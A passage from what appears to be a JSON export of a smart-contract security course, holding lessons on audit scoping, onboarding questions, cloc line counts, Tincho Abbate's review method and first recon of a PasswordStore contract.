[Aderyn](https://github.com/Cyfrin/aderyn)\n\nFuzzing/Invariant Tests\n\n- [Foundry Test Suite](https://github.com/foundry-rs/foundry)\n\nFormal Verification\n\n- [Certora](https://www.certora.com/)\n\nAI\n\n- [Phind](https://www.phind.com/search?home=true)\n- [ChatGPT](https://chat.openai.com)\n- [Co-Pilot](https://github.com/features/copilot)\n- [AI Limitations](https://github.com/ZhangZhuoSJTU/Web3Bugs)\n\n### Audit Readiness\n\nBefore a protocol is even ready for an audit, they should consider where they stand on the [**Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/) or other checklists like nacentxyz's [**simple-security-toolkit**](https://github.com/nascentxyz/simple-security-toolkit)\n\n### Always be Learning\n\nWe need to always be improving as security researchers and adopt an `attacker vs defender` mindset. It's only by staying informed and constantly improving that we can stay ahead of the problem.\n\nWe touched on top attack vectors that are hitting Web3 to this day (including re-entrancy which has been around since _2016!_).\n\nHopefully, with you taking this course we can learn from the mistakes in the past and finally reign in the exploitation in Web3.\n",
          "updates": []
        },
        {
          "lessonId": "4c9a5a26-4242-41f9-8764-093d3776afef",
          "number": 8,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "8-exercises",
          "description": "",
          "duration": 3,
          "videoUrl": "vM5P9GThlMPgtYln1Dsj3dlIjAeXh02UeCO58Cidjt01M",
          "rawMarkdownUrl": "/routes/security/2-audit/8-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n_Follow along with this video:_\n\n---\n\n### Section 2: Excercises\n\n---\n\nðŸŽ¯ Exercise: `Sign up for at least 1 security/web3 newsletter!`\n\nThe reason this is so important is that you are now a security _researcher_. Keyword - `researcher`. You need to constantly be learning and taking in new things.\n\nIn this course we're going to be studying other people's reports, studying other audits (using a tool called [**Solodit**](https://solodit.xyz/)) and we'll be continuously learning from previous exploits.\n\n> Exploits in the space are learning opportunities for us to improve as security researchers.\n\nHere are some newletters/resources to check out:\n\n- [Blockchain Threat Intelligence](https://newsletter.blockthreat.io/?r=2mgsm7) (referral link)\n- [Solodit](https://solodit.xyz/)\n- [Rekt](https://rekt.news/)\n- [Week In Ethereum](https://weekinethereumnews.com/)\n- [Consensys Diligence Newsletter](https://consensys.io/diligence/newsletter/)\n- [Officer CIA](https://officercia.mirror.xyz/)\n\nWith all that said, you've now completed the high-level overview of what this process looks like. You should be very proud of yourself.\n\nTake a break and prepare to dive into our first audit together - Puppy Raffle.\n\nSection 2 NFT Challenge ðŸ‘€\n\n[Hardest one of the whole course (Arb)](https://arbiscan.io/address/0xeab9c7ac697408fd1581494577c7c0716c3b75e6)\n\n[Hardest one of the whole course (Sepolia)](https://sepolia.etherscan.io/address/0x34d130b174f4a30a846fed7c02fcf53a19a4c2b6#code)\n",
          "updates": []
        }
      ]
    },
    {
      "number": 3,
      "sectionId": "62db753e-7568-4d6a-b630-823949273491",
      "title": "Your First Audit | PasswordStore",
      "slug": "first-audit",
      "folderName": "3-first-audit",
      "lessons": [
        {
          "lessonId": "074d29d9-9aac-4daf-b61f-3b040acc2acd",
          "number": 1,
          "title": "Your First Security Review",
          "slug": "first-review",
          "folderName": "1-first-review",
          "description": "",
          "duration": 5,
          "videoUrl": "xi009v02oVduUZvKxmOSpvgVJ9gMiT5uVH5hpYpposeNk",
          "rawMarkdownUrl": "/routes/security/3-first-audit/1-first-review/+page.md",
          "markdownContent": "---\ntitle: Your First Security Review\n---\n\n_Follow along with this video:_\n\n---\n\nWelcome everyone! I hope you're well-rested, rehydrated, and ready to dive into the nitty-gritty of how smart contract audits work. We've had a good start with a high-level overview of what a smart contract audit or a security review contains. Now, we're going to go a level further by conducting not one, but a handful of audits over the next 6 sections.\n\nThis is an exciting journey to improve our understanding of audits. We'll strengthen our knowledge and learn from some of the best people in the world such as Hans, the number one competitive auditor in the world for the first half of 2023. Now letâ€™s kick things off with the Password Store audit.\n\n### The PasswordStore Audit: A Closer Look\n\nFor out first audit we're immersing ourselves into a scenario where we're auditing the PasswordStore protocol, just like you could if you were working for a firm like Cyfrin. It's a very immersive and experiential way of learning as we'll be adopting the role of a security researcher who has just received an audit request from a protocol.\n\nIn later lessons we'll also go through the process of submission findings in a competive scenario like `CodeHawks`\n\n<img src=\"/security-section-3/1-review/firstaudit1.png\" style=\"width: 100%; height: auto;\">\n\n### The End Goal\n\nBefore jumping into this process ourselves, I'd like us to look at what we're striving towards. Below you can find links to the PasswordStore repo at various phases of an audit.\n\n- [**Security Review CodeV1**](https://sepolia.etherscan.io/address/0x2ecf6ad327776bf966893c96efb24c9747f6694b)\n- [**Security Review CodeV2**](https://github.com/Cyfrin/3-passwordstore-audit)\n- [**Security Review CodeV3**](https://github.com/Cyfrin/3-passwordstore-audit/tree/onboarded)\n- [**Security Review Final**](https://github.com/Cyfrin/3-passwordstore-audit/tree/audit-data)\n\nTake a look specifically at `Security Review Final`. The `audit-data` folder contains all the things you'll be able to build by the end of this section, including a professional PDF audit report.\n\n### Remember the Phases\n\nItâ€™s important to remember the phases for each audit or security review. They include:\n\n1. Initial Review\n   - Scoping\n   - Reconnaissance\n   - Vulnerability Detection\n   - Reporting\n2. Protocol Fixes\n   - Fixes issues\n   - retests and adds tests\n3. Mitigation Review\n   - Reconnaissance\n   - Vulnerability Detection\n   - Reporting\n\nIn this course, our main focus will primarily be on how to perform your initial review.\n\nWe're starting out small with a codebase of less than 20 lines, but this is just the beginning. It's important to remember that _you_ are the security researcher and often times what may be clear or obvious to you, isn't to a protocol. Your expertise is valuable.\n\nSo, with the expectations set and our targets defined, let's move ahead and commence our very first smart contract audit or security review. We'll start off with a scenario that will help us better understand what our roles as auditors will look like.\n",
          "updates": []
        },
        {
          "lessonId": "2024196b-0a32-4a2e-a04b-da11d01beb92",
          "number": 2,
          "title": "Scoping: Etherscan",
          "slug": "etherscan",
          "folderName": "2-etherscan",
          "description": "",
          "duration": 6,
          "videoUrl": "TBBnNcYbNpBbC2KO0100y2ZltsqKEF8F7StV2LDM7JKv8",
          "rawMarkdownUrl": "/routes/security/3-first-audit/2-etherscan/+page.md",
          "markdownContent": "---\ntitle: Scoping Raw Etherscan\n---\n\n_Follow along with this video:_\n\n---\n\n## Phase 1: Scoping\n\nIn this lesson, we'll examine the initial steps of performing a security review using our PasswordStore codebase. I'm going to take a deep-dive into the scoping phase, which is the primary step in conducting a security review.\n\n### The Scoping Phase and Initial Review\n\nThe scoping phase is the point we initially receive a codebase for review and we perform a high level assessment.\n\nImagine a scenario like this:\n\n_CLIENT: \"Hi, we're the PasswordStore dev team looking to get our codebase audited ASAP to get it listed officially.\"_\n\n_AUDITOR: \"Hi PasswordStore, I'm beginner-auditor. Really excited to help. Could you send your codebase to me?\"_\n\n_CLIENT: \"Sure, here's the etherscan link to our codebase.\" [**PasswordStore CodeV1**](https://sepolia.etherscan.io/address/0x2ecf6ad327776bf966893c96efb24c9747f6694b)_\n\nThis exchange is all too common, and it's horrible. It's your responsibility as a security researcher to not audit codebases provided to you in this way.\n\nWhy?\n\nAs security researchers, you're looking for more than bugs. You're looking for code maturity. If all you have is a codebase on etherscan, if there's no test suite, if there's no deployment suite you should be asking: `how mature is this code?`\n\n> **Remember: Secure protocols not only safeguard the code but also our reputation as researchers. They will likely blame us for a security breach if we've audited a compromised codebase.**\n\nIf all they provide is an etherscan link, can you assure the protocol's safety? In these cases, the answer is a resounding **NO**.\n\n### Audit Readiness\n\nOne of the first things we covered when discussing preparing for an audit was the concept of `Audit Readiness` and steps protocols should take prior to requesting an audit.\n\nYou should recall the [**Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/) from a previous lesson.\n\nHow does your client's protocol stand up against these questions?\n\n<img src=\"/security-section-2/3-rekt/rekt1.png\" style=\"width: 100%; height: auto;\">\n\nIf all they've provided you is an Etherscan link - the answer is poorly.\n\n> **If you're offered monetary reward to audit an Etherscan-only codebase, that's a red flag. Say NO. Doing otherwise contradicts our mission to promote secure protocols.**\n\nDo not take clients who have not shown the same commitment to security in their codebase as you would. If you work with clients like those described above, it should be to educate them on how to write good tests and how to prepare their code for a review.\n\n_AUDITOR: \"Hi, PasswordStore. Thank you so much for this Etherscan link, this is a great start. However, do you have a test suite? We want to have every assurance that your codebase is safe and secure. Do you have a Git Repo or GitHub with a testing framework?\"_\n\n_CLIENT: \"AH! Yes, Sorry. We have a Foundry Test repo set up for this, let me send you that Git codebase.\"_\n\nIf a protocol's response to your care in securing them isn't like they above, and they begin pressuring you - walk away. It's evidence that security isn't their focus.\n",
          "updates": []
        },
        {
          "lessonId": "b7294794-b3b1-4ee5-b00d-20a84f815bd3",
          "number": 3,
          "title": "Scoping: Audit Details",
          "slug": "details",
          "folderName": "3-details",
          "description": "",
          "duration": 13,
          "videoUrl": "BXBrKOTDgRH1kLCkbuvDeKi402N00ORbbYBcr1p1jRzjo",
          "rawMarkdownUrl": "/routes/security/3-first-audit/3-details/+page.md",
          "markdownContent": "---\ntitle: Nailing the Audit Details\n---\n\n_Follow along with this video:_\n\n---\n\n### Getting Started\n\nAlright! Starting off, our client has graciously updated the codebase for this security review, featuring an improved framework and enhanced verbosity in their [**Security Review CodeV2**](https://github.com/Cyfrin/3-passwordstore-audit).\n\nExploring the new codebase, we find it to be comprehensive with an `src` folder and a script detailing deployment procedures. However, as we dig in, we find that the README needs refinement and tailoring to our needs rather than the template Foundry README. There is also a glaring omission â€” there are no test folders.\n\nIn addition to this, we're not really sure what we should be focusing on in our review. It's unlikely the client wants us auditing libraries, or scripts - but these are vital things to confirm with them in the scoping phase before beginning the audit.\n\n### Preparing for the Audit: Onboarding Questions\n\nFor your convenience, we've compiled a reference of [**Minimal Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md). This document will help you extract the minimum information necessary for a successful audit or security review.\n\nWe've also included a more [**Extensive Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/extensive-onboarding-questions.md) document which is more derivative of what we at Cyfrin use for private audits - we'll go over this in more detail later.\n\nLet's go through these questions and understand why each one is important in preparing for our security review.\n\n1. **About the Project:** Knowledge about the project and its business logic is crucial. You need to be aware of what the project is intended to do so as to spot areas where code implementation does not align with the project's purpose. Remember 80% of vulnerabilities are a product of business logic implementation!\n2. **Stats:** Information about the size of the codebase, how many lines of code are in scope, and its complexity are incredibly vital. This data will help to estimate the timeline and workload for the audit.\n3. **Setup:** We need to ask the protocol how to build and test the project, which frameworks they've used etc.\n4. **Review Scope:** Know the exact commit hash that the client plans to deploy and the specific elements of the codebase it covers. You do not want to spend time auditing code that the client has already modified or doesn't plan to use. The protocol should include the appropriate GitHub URL and explicitly detail which contracts are in scope.\n5. **Compatibilities:** Information about the solidity version the client is using, the chains they plan on working with, and the tokens they will be integrating is important, we'll go into why later.\n6. **Roles:** This entails understanding the different roles and powers within the system and detailing what the different actors should and shouldn't be able to do.\n7. **Known Issues:** Understanding existing vulnerabilities and bugs which are already being considered/fixed. This will allow you to focus on the hidden issues.\n\nAsking the questions of your client is an integral part of assuring they're ready for an audit. Should a protocol give push back, this is a red flag that they aren't taking security as seriously as they should.\n\nAs security researchers you're, in a way, educators. It's your job to educate protocols on the importance of these security considerations and adequate documentation.\n\nOnce our client has provided answers to the above and provided an updated codebase ([**Security Review CodeV3**](https://github.com/Cyfrin/3-passwordstore-audit/tree/onboarded)) they've also filled out the [**questionnaire**](https://github.com/Cyfrin/3-passwordstore-audit/blob/onboarded/minimal-onboarding-filled.md) we provided them.we're finally ready to..\n\n### Dig into the Updated Codebase\n\nYour client should have provided you a commit hash. By navigating to the GitHub Repo's commit history, you can used the first `7 characters` of the commit hash to find the exact version of the repo to focus on. We'll be going over cloning this locally later in the course.\n\n<img src=\"/security-section-3/3-details/details2.png\" style=\"width: 100%; height: auto;\">\n\nLet's go through the client's submitted details.\n\n### About\n\nWe see the client has provided us more information about the protocol and its goals/intents.\n\n```md\nA smart contract application for storing a password. Users should be able to store a password and then retrieve it later. Others should not be able to access the password.\n```\n\n### Setup\n\nWe're also now given clear instructions on how to set up the project locally, with information on how to test the repo and frameworks being used.\n\n---\n\n**Requirements**\n\n- [**Git**](https://git-scm.com/book/en/v2/Getting-Started-Installing-Git)\n  - You'll know you did it right if you can run git --version and you see a response like git version x.x.x\n- [**Foundry**](https://getfoundry.sh/)\n  - You'll know you did it right if you can run forge --version and you see a response like forge 0.2.0 (816e00b 2023-03-16T00:05:26.396218Z)\n\n**Quick Start**\n\n```md\ngit clone https://github.com/Cyfrin/3-passwordstore-audit\ncd 3-passwordstore-audit\nforge build\n```\n\n**Usage**\n\n**Start a local node**\n\n```md\nmake anvil\n```\n\n**Deploy**\n\n```md\nmake deploy\n```\n\n**Testing**\n\n```md\nforge test\n```\n\n**Test Coverage**\n\n```md\nforge coverage\n```\n\n**and for coverage based testing:**\n\n```md\nforge coverage --report debug\n```\n\n---\n\n### Scope\n\nFor this particular example, the client has provided scope:\n\n```\n./src/\nâ””â”€â”€ PasswordStore.sol\n```\n\nIn this case, a single contract - depending on the maturity of the protocol, you may want to request to include their deployment process, or to provide feedback on their tests - but this is largely a private audit consideration. In competitive audits, the outlined scope is the only code that will be valid.\n\n### Compatibilities\n\nReading further into the client's documentation, we see they've provided compatibilities. Vulnerabilities and exploits may vary from chain to chain, or token to token, so these details are always valuable for us.\n\n```md\nSolc Version: 0.8.18\nChain(s) to deploy contract to: Ethereum\n```\n\n### Roles\n\nWe now also have clearly defined roles! This gives us clear insight into whom is expected to have what powers.\n\n```md\nOwner: The user who can set the password and read the password.\nOutsides: No one else should be able to set or read the password.\n```\n\n### Known Issues\n\nOur client reports that there are **No** known issues with their codebase. I love the confidence.\n\n### Local Setup\n\n. Go ahead and follow the `quick start` guide our client as provided.\n\n```md\ngit clone https://github.com/Cyfrin/3-passwordstore-audit\ncd 3-passwordstore-audit\ncode .\n```\n\nThis will open a new VS Code window in your cloned directory. Now we want to `checkout` the exact commit hash in our audit scope by running:\n\n```bash\ngit checkout <commithash>\n```\n\nThis will switch you to a `detached HEAD` state of the branch we want. Basically this is a state where changes won't be saved, so let's create a branch we want to work on officially:\n\n```bash\ngit switch -c passwordstore-audit\n```\n\nWe can confirm the branch we're on now by running:\n\n```bash\ngit branch\n```\n\n### Wrap Up\n\nThis may have seemed like a lot, but I promise this becomes second nature as you repeatedly do this. Remember to ask the protocol the questions necessary to assure they are prepared for their audit and step into the role of a security educator to teach them best practices around security and code documentation.\n\nNow we're finally ready to begin looking at the code base and getting our hands dirty!\n",
          "updates": []
        },
        {
          "lessonId": "2b4e7a53-dc86-4f8f-a522-2b5e762cb09b",
          "number": 4,
          "title": "Scoping: cloc",
          "slug": "cloc",
          "folderName": "4-cloc",
          "description": "",
          "duration": 3,
          "videoUrl": "Hby7oUlL5mA3WH6V7FrpykgJDIbCMxKo9w9Bn3PIlL4",
          "rawMarkdownUrl": "/routes/security/3-first-audit/4-cloc/+page.md",
          "markdownContent": "---\ntitle: Scoping CLOC\n---\n\n_Follow along with this video:_\n\n---\n\nYou may have noticed that we skipped over the `Stats` section of the protocol's README. This section of the documentation is comprised of a line count and complexity rating typically and you should be prepared to calculate these details for your client and use them to estimate the duration of your audit. In this lesson we're going to go over how that's done.\n\nOne of the components of the `Stats` section is `nSLOC` or `number of source lines of code`. A very simple tool exists to help us derive this count.\n\n[**CLOC**](https://github.com/AlDanial/cloc) - cloc counts blank lines, comment lines, and physical lines of source code in many programming languages. It's compatible with Solidity, Python, Rust and many more.\n\n### Installing and Using CLOC\n\nFirst step is installation. The step by step won't be covered here, but pick the method you're most comfortable with.\n\n```md\nnpm install -g cloc # https://www.npmjs.com/package/cloc\nsudo apt install cloc # Debian, Ubuntu\nsudo yum install cloc # Red Hat, Fedora\nsudo dnf install cloc # Fedora 22 or later\nsudo pacman -S cloc # Arch\nsudo emerge -av dev-util/cloc # Gentoo https://packages.gentoo.org/packages/dev-util/cloc\nsudo apk add cloc # Alpine Linux\ndoas pkg_add cloc # OpenBSD\nsudo pkg install cloc # FreeBSD\nsudo port install cloc # macOS with MacPorts\nbrew install cloc # macOS with Homebrew\nchoco install cloc # Windows with Chocolatey\nscoop install cloc # Windows with Scoop\n```\n\nOnce successfully installed, verify your installation.\n\n```bash\ncloc --help\n```\n\nOnce installed, you can run using the command `cloc <directory>`. Our PasswordStore example should look like this:\n\n```bash\ncloc ./src/\n```\n\nThis is what the output might look like:\n\n<img src=\"/security-section-3/4-cloc/cloc1.png\" style=\"width: 100%; height: auto;\">\n\n### The Importance of Knowing Your Codebase Size\n\nWhy is knowing the number of source lines of code (also referred to as Nsloc) crucial? The answer lies in the process of auditing and security research.\n\nAs you perform more audits and delve further into security research, you'll start to gauge the pace at which you can audit a code base. Understanding that pace enables you to estimate more accurately the time required for future coding or auditing tasks based on the size of the code base.\n\nThis is incredibly useful, as with time, you can use your past audit experience and tell the protocol you're working with how long it will take to audit their codebase. Notably, this pace tends to speed up as you do more security reviews. Nevertheless, it's a good starting point.\n\n> _\"When auditing 1000 lines of code for the first time, you now have an estimated timeline for subsequent audits or security reviews of 1000 lines codebases.\"_\n\nOften, competitive audits might have a quicker timeline depending on the auditing platform. Upon having a good grasp of your auditing speed, it may assist in selecting competitive audits that align with your capabilities, or even ones that push you to accelerate your pace.\n\n### Wrap Up\n\n`Stats` like a protocol's `nSLOC` (number of source lines of code) are very valuable to security reviewers. They afford you the ability to gauge how long an audit will take based on your current skill set and provide more accurate estimates for both the protocol and yourself with respect to timelines and workload.\n",
          "updates": []
        },
        {
          "lessonId": "4729ad23-b598-4fb9-bbde-10e36f33d315",
          "number": 5,
          "title": "Recap I",
          "slug": "recap-i",
          "folderName": "5-recap-i",
          "description": "",
          "duration": 3,
          "videoUrl": "smoYD01Ts102Hl01jqqrXktfZXw6JoF4h447OcwQS01upT8",
          "rawMarkdownUrl": "/routes/security/3-first-audit/5-recap-i/+page.md",
          "markdownContent": "---\ntitle: Recap I\n---\n\n_Follow along with this video:_\n\n---\n\n### Recap\n\nWe've learnt so much so far in this section, let's do a quick refresher of what we've covered!\n\n### Embracing Your Role as a Security Researcher\n\nFirst and foremost, you are not just coders or developers - you are security researchers. You are the gatekeepers ensuring the integrity of smart contracts. Our goal is to ensure that these protocols are not only safe and secure but also well-documented and supported with a robust test suite.\n\nA link to Etherscan is insufficient and we need to educate these protocols on best practices and the benefits of proper audit preparation.\n\n> \"Smart contracts are the most adversarial environment on the planet, and we need to treat them as such.\"\n\nIf you are handed a code base within a smart contract development framework, yet find it lacking adequate tests or documentation, remember, this isn't going to be helpful.\n\n> Remember `80%` of the vulnerabilities out there are a product of `business logic`\n\nWe need a clear understanding of what a protocol _does_ and _how_. This should be well documented.\n\nAs much as we need more information from protocol developers, sometimes, it falls upon us, the security researchers, to educate them about the best security practices.\n\n### Scoping Out a Codebase\n\nWe've went over the [**Minimal Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md)\n\nThe importancee of each section can't be overstated.\n\n**About** - Summary of the project. The more documentation, the better.\n\n**Stats** - Calculate the `nSLOC` using tools like `CLOC`\n\n**Setup** - What tools are needed to setup the codebase & test suite? How to run tests. How to see test coverage.\n\n**Scope** - We need an exact commit hash and the specific contracts `in scope` to be detailed\n\n**Roles** - What are the different actors of the system? What are their powers? What should/shouldn't they do?\n\n**Known Issues** - any issues that the protocol team is aware of and will not be acknowledging/fixing.\n\nWhen we get more advanced, we'll have a more [**extensive onboarding form**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/extensive-onboarding-questions.md), but we'll cover that later in the course.\n\nEventually you may want to customize this form to suit your needs.\n\n### Congratulatory Note and a Sneak Peek\n\n**A huge congratulations on reaching this far!** ðŸ¥³\n\nI know the journey might seem verbose and daunting, but trust me, all these painstaking steps are crucial. They will save you hours in the future, especially if you consider becoming an independent auditor or starting your own firm.\n\nKeep sharp, in our next lesson we'll be going over `The Tincho` an auditing technique used by the legendary `Tincho Abbate`.\n",
          "updates": []
        },
        {
          "lessonId": "bfb6c3c7-e21e-4071-8144-ee62b276d586",
          "number": 6,
          "title": "\"The Tincho\"",
          "slug": "process-tincho",
          "folderName": "6-process-tincho",
          "description": "",
          "duration": 15,
          "videoUrl": "khYrr59ml01mq9jd002HJ6Tb00IwQhInpgoZ6z2byEPYI00",
          "rawMarkdownUrl": "/routes/security/3-first-audit/6-process-tincho/+page.md",
          "markdownContent": "---\ntitle: The Audit Process With Tincho\n---\n\n_Follow along with this video:_\n\n---\n\n### Reconnaissance\n\nWe've finally scoped out our client's code base and we're ready to dive into looking more closely at the code.\n\nTo do this, we're going to learn some best practices and a technique I've dubbed `The Tincho` from the master himself - Tincho Abbate.\n\n### Introducing Tincho\n\nTincho is a legend in Web3 security and is a member of [**The Red Guild**](https://theredguild.org/), a smart contract and EVM security firm. He was a previous lead auditor for the security firm at `OpenZeppelin` and he even helped me create this course!\n\nWe're lucky to have Tincho walk us through his high-level way to approach security reviews.\n\n_What follows is derived from a video featuring Tincho's point of view_\n\n### The Tincho Auditing Method\n\nTo illustrate the Tincho auditing method, we're going to refer to a video where Tincho performs a live auditing of the Ethereum Name Service (ENS).\n\n> \"I don't have a super formal auditing process. I will just show you briefly some things that I do...\" - Tincho\n\n### First Step\n\nFirst thing's first - download the code, and **read the documentation**. You need to familiarize yourself with the content and context of the codebase, learn the jargon you can expect to see in the code and become comfortable with what the protocol is expected to do.\n\n**READ THE DOCUMENTATION**\n\n### Tools and Frameworks\n\nTincho describes a number of tools he uses while performing security reviews, bring the tools you're most familiar and best with.\n\n- **VS Codeium**: a text editor with a privacy focus. It's based on VS Code but removes a lot of the user tracking telemetry\n- **Foundry**: As a framework for reviewing codebases Foundry is incredibly fast and allows for quick testing with it's robust test suite\n- **CLOC**: A simple command-line utility that helps count lines of code which can give a sense of the complexity of different parts of the codebase.\n- **Solidity Metric**: Another tool developed by Consensys that provides useful metrics about your Solidity codebase.\n\nBy leveraging `CLOC` and `Solidity Metrics`, a security researcher can organize the codebase by complexity and systemically go through the contracts - marking them each complete as appropriate. This pragmatic approach ensures no stone is left unturned.\n\nIt's recommended to start with the smaller and more manageable contracts and build upon them as you go.\n\nThere's a point in an audit where your frame of mind should switch to an adversarial one. You should be thinking _\"How can I break this...\"_\n\n<img src=\"/security-section-3/6-the-tincho/tincho1.png\" style=\"width: 100%; height: auto;\">\n\nGiven even simple functions like above, we should be asking ourselves\n\n- **\"Will this work for every type of token?\"**\n- **\"Have they implemented access control modifiers properly?\"**\n\n> _USDT is a 'weird ERC20' in that it doesn't return a boolean on transferFrom calls_\n\n### Audit, Review, Audit, Repeat\n\nKeeping a record of your work is crucial in this process.\n\n> Tincho recommends taking notes directly in the code _and_ maintaining a separate file for raw notes/ideas.\n\nRemember, there is always a risk of diving too deep into just one part of the code and losing the big picture. So, remember to pop back up and keep an eye on the over-all review of the code base.\n\nNot everything you'll be doing is a manual review. Applying your knowledge of writing tests to verify suspicions is incredibly valuable. Tincho applies a `fuzz test` to his assessment of functions within the ENS codebase.\n\n### Communication\n\nTincho describes keeping an open line of communication with the client/protocol as `fundamental`. The protocol is going to possess far more contextual understanding of what constitutes intended behavior than you will. Use them as collaborators. **`Trust but validate.`**\n\n> \"I would advise to keep the clients at hand. Ask questions, but also be detached enough.\" - Tincho\n\n### Wrapping it Up\n\nSometimes it can feel like there's no end to the approaches you can make to a codebase, no end to the lines of code you can check and verify.\n\nTincho advocates for time-bounding yourself. Set limits and be as thorough as possible within them.\n\n> \"The thing is...I always get the feeling that you can be looking at a system forever.\" - Tincho\n\n### The Audit Report and Follow Up\n\nThe last stage of this whole process is to present an audit report to the client. It should be clear and concise in the detailing of discovered vulnerabilities and provide recommendations on mitigation.\n\nIt's our responsibility as security researchers to review the implementation of any mitigations the client employs and to assure that _new bugs_ aren't introduced.\n\n### Aftermath of a Missed Vulnerability\n\nThere will always be the fear of missing out on some vulnerabilities and instead of worrying about things that slip through the net, aim to bring value beyond just identifying vulnerabilities. Be that collaborative security partner/educator the protocol needs to employ best practices and be prepared holistically.\n\nAs an auditor it's important to remember that you do not shoulder the whole blame when exploits happen. You share this responsibility with the client.\n\n> This doesn't give you free reign to suck at your job. People will notice.\n\nA last takeaway from Tincho:\n\n> \"Knowing that youâ€™re doing your best in that, knowing that youâ€™re putting your best effort every day, growing your skills, learning grows an intuition and experience in you.\"\n",
          "updates": []
        },
        {
          "lessonId": "2c621243-12a8-4b87-a757-dc85c1ec9bd5",
          "number": 7,
          "title": "Recon: Context",
          "slug": "context",
          "folderName": "7-context",
          "description": "",
          "duration": 5,
          "videoUrl": "pAws02rmrcgSlXrGrXrrikJoABnxom7Fg00lOH7UFUjyY",
          "rawMarkdownUrl": "/routes/security/3-first-audit/7-context/+page.md",
          "markdownContent": "---\ntitle: Recon - Getting Context\n---\n\n_Follow along with this video:_\n\n---\n\n### First Step: Understanding The Codebase\n\nAlright, we're ready to begin our recon, if you haven't already clone the repo our client has provided us.\n\n```bash\ngit clone https://github.com/Cyfrin/3-passwordstore-audit.git\ncd 3-passwordstore-audit\ncode .\n```\n\nIf we're following `The Tincho` method, our first step is going to be reading the docs and familiarizing ourselves with the codebase. In VS Code, you can click on the `README.MD` file in your workspace and use the command `CTRL + SHIFT + V` to open the preview mode of this document.\n\n> You can also open the preview pane by opening your command pallet and typing `markdown open preview`.\n\n_Quick tip: Check if an extension must be installed for Vs Code if it's not working for you._\n\n<img src=\"/security-section-3/7-context/context2.png\" style=\"width: 100%; height: auto;\">\n\nAlready, we should be thinking about potential attack vectors with the information we've gleaned.\n\n_Is there any way for an unauthorized user to access a stored password?_\n\nOnce you've finished reading through the documentation, we can proceed to...\n\n### Scoping Out The Files\n\nFollowing Tincho's advice our next step will be to organize the files of the protocol in scope and assess their respective complexity. (Spoiler, this first example is pretty simple).\n\n1. Download and install the [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) extension for VS Code.\n\n<img src=\"/security-section-3/7-context/context3.png\" style=\"width: 100%; height: auto;\">\n\n2. Once installed, you can right-click the appropriate folders to run the tool on and select `Solidity: Metrics` from the context menu.\n\n> _Pro-tip: If your repo has more than one applicable folder, you can CTRL + Click to select multiple simultaneously._\n\n<img src=\"/security-section-3/7-context/context4.png\" style=\"width: 100%; height: auto;\">\n\nAfter generating the report, navigate to the command palette and locate 'export this metrics report'. Once exported, you'll have HTML access to the report for future reference.\n\n<img src=\"/security-section-3/7-context/context5.png\" style=\"width: 100%; height: auto;\">\n\nApplying Tincho's methodology to this process, we can:\n\n1. Scroll down to the section containing the various files and their lengths.\n2. Copy this info and paste it onto any platform that allows for easy viewing and comparisonâ€” like Google Sheets or Notion.\n\n> Please note that if your codebase contains a solitary file like ours, this step won't be necessary.\n\nSome aspects I'll draw your attention to in this metrics report are the `Inhertance Graph`, `The Call Graph`, and `The Contracts Summary`. It's not super obvious with such a simple protocol, but these are going to provide valuable insight down the line. Familiarize yourself with them now (way at the bottom).\n\n<img src=\"/security-section-3/7-context/context6.png\" style=\"width: 100%; height: auto;\">\n\nUnderstanding your codebase and its functionalities is the first step towards securing it.\n\n### Wrap Up\n\nNow that we've got a sense of what lies before us, with the help of our tools like CLOC and Solidity Metrics, we're ready to assess the code.\n\nLet's see what we can find.\n",
          "updates": []
        },
        {
          "lessonId": "74157e59-a92c-4769-80d0-7a546369f7d6",
          "number": 8,
          "title": "Recon: Understanding the code",
          "slug": "understanding-the-code",
          "folderName": "8-understanding-the-code",
          "description": "",
          "duration": 3,
          "videoUrl": "iAYbiPR8PadCov18QADc49PfsLUzK9SHE4J7gaZ8z9s",
          "rawMarkdownUrl": "/routes/security/3-first-audit/8-understanding-the-code/+page.md",
          "markdownContent": "---\ntitle: Recon - Understanding the Code\n---\n\n_Follow along with this video:_\n\n---\n\n### How Tincho Cracked the Code\n\nTincho, was very pragmatic in his approach, literally going through the code line by line. This method might seem like he was looking for bugs/vulnerabilities in the code. But actually, he was just trying to understand the codebase better. In essence, understanding the functionalities and architecture of the code forms the first and most important part of code inspection.\n\nSo let's take it from the top, just like Tincho didâ€¦\n\n### Understanding What the Codebase Is Supposed to Do\n\nOur client's documentation has let us know what the intended functionality of the protocol are. Namely: A user should be able to store and retreive their password, no one else should be able to see it.\n\nLet's try to find this functionality within the code as we go through things line by line.\n\n### Scanning the Code from the Top\n\nAfter gaining a fundamental understanding, you can start going through the code. You can jump directly to the main functionality. However, to keep things simple, let's just start right from the top and start working our way down.\n\nFirst Lines:\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n```\n\nThe open source license seems fine. A compiler version of `0.8.18` may not be an immediate concern, but we do know that this isn't the most recent compiler version. It may be worthwhile to make note of this to come back to.\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.18; // Q: Is this the correct compiler version?\n```\n\nFormatting our in-line comments in a reliable way will allow us to easily come back to these areas later by leveraging search.\n\n<img src=\"/security-section-3/8-understanding-code/understanding1.png\" style=\"width: 100%; height: auto;\">\n\n### Taking Notes\n\nAs Tincho had advised, creating a separate file to dump thoughts into and compile notes can be a valuable organizational tool. I like to open a file called `.notes.md` and outline things like potential `attack vectors`\n\n> **Pro Tip**: Some security researchers, like 0Kage from the Cyfrin team, even print the source code and use different colour highlighters to visualize the codebase better.\n\n### Moving Further\n\nNext we see some `NatSpec` comments like this can be considered **extended documentation** and will tell us more about what the protocol is expected to do.\n\n```js\n/*\n * @author not-so-secure-dev\n * @title PasswordStore\n * @notice This contract allows you to store a private password that others won't be able to see.\n * You can update your password at any time.\n */\n```\n\nThe intended functionality is pretty clear. Maybe we want to jot this down in our `.notes.md`.\n\nLet's consider things upto our constructor.\n\n<img 